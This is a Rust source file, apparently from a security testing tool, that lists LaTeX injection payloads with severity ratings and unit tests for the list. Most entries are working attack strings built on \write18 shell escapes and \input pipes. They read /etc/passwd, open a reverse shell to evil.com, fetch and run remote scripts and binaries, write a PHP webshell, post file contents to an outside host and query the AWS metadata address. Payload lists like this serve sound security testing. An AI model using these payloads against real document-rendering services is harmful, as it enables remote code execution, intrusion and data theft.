use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::Latex,
        "file-read", [
            ("\\input{/etc/passwd}", "LaTeX input file read", Severity::Critical),
            ("\\include{/etc/passwd}", "LaTeX include file read", Severity::Critical),
            ("\\lstinputlisting{/etc/passwd}", "LaTeX listing input file read", Severity::Critical),
            ("\\verbatiminput{/etc/passwd}", "LaTeX verbatim input file read", Severity::Critical),
            ("\\immediate\\write18{cat /etc/passwd > /tmp/out}", "Shell escape file read via write18", Severity::Critical),
        ];
        "command-exec", [
            ("\\write18{id}", "Shell escape command execution", Severity::Critical),
            ("\\immediate\\write18{cat /etc/passwd}", "Shell escape cat via write18", Severity::Critical),
            ("\\write18{bash -i >& /dev/tcp/evil.com/4444 0>&1}", "Shell escape reverse shell", Severity::Critical),
            ("\\write18{curl http://evil.com/shell.sh | sh}", "Shell escape remote code download", Severity::Critical),
            ("\\write18{wget http://evil.com/evil -O /tmp/evil && chmod +x /tmp/evil && /tmp/evil}", "Shell escape download and execute", Severity::Critical),
        ];
        "ssrf", [
            ("\\href{http://evil.com}{Click}", "External link SSRF", Severity::High),
            ("\\includegraphics{http://evil.com/track.png}", "External image SSRF", Severity::High),
            ("\\input{|\"http://evil.com/shell.sh\"}", "Pipe URL input SSRF", Severity::Critical),
            ("\\write18{curl http://evil.com/ssrf}", "SSRF via shell escape curl", Severity::Critical),
            ("\\url{http://169.254.169.254/latest/meta-data/}", "AWS metadata SSRF", Severity::Critical),
        ];
        "file-write", [
            ("\\immediate\\write18{echo injected > /tmp/output.txt}", "Shell escape file write", Severity::Critical),
            ("\\newwrite\\myfile\\immediate\\openout\\myfile=/tmp/evil.tex\\immediate\\write\\myfile{injected}\\immediate\\closeout\\myfile", "TeX file write via openout", Severity::Critical),
            ("\\write18{echo '<?php system($_GET[c]); ?>' > /var/www/shell.php}", "PHP webshell write via shell escape", Severity::Critical),
            ("\\input{|\"echo injected > /tmp/output.txt\"}", "Pipe file write via input", Severity::Critical),
            ("\\write18{cp /etc/passwd /tmp/passwd_copy}", "File copy via shell escape", Severity::High),
        ];
        "exfiltration", [
            ("\\href{http://evil.com/?data=\\input{/etc/passwd}}{Click}", "Data exfiltration via link", Severity::Critical),
            ("\\write18{curl -d @/etc/passwd http://evil.com/exfil}", "Data exfiltration via curl POST", Severity::Critical),
            ("\\includegraphics[alt=\\input{/etc/passwd}]{image.png}", "Data exfiltration via alt text", Severity::High),
        ];
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "LaTeX payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_latex_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Latex);
        }
    }

    #[test]
    fn contains_file_read() {
        let payloads = get_payloads();
        let has_file_read = payloads
            .iter()
            .any(|p| p.payload.contains("\\input{") || p.payload.contains("\\write18{cat"));
        assert!(has_file_read, "Must contain LaTeX file read payloads");
    }

    #[test]
    fn contains_command_execution() {
        let payloads = get_payloads();
        let has_cmd_exec = payloads
            .iter()
            .any(|p| p.payload.contains("\\write18{"));
        assert!(has_cmd_exec, "Must contain LaTeX command execution payloads");
    }

    #[test]
    fn contains_ssrf() {
        let payloads = get_payloads();
        let has_ssrf = payloads.iter().any(|p| {
            p.payload.contains("evil.com") || p.payload.contains("169.254.169.254")
        });
        assert!(has_ssrf, "Must contain LaTeX SSRF payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 15,
            "Must have substantial LaTeX injection coverage, got {}",
            payloads.len()
        );
    }
}
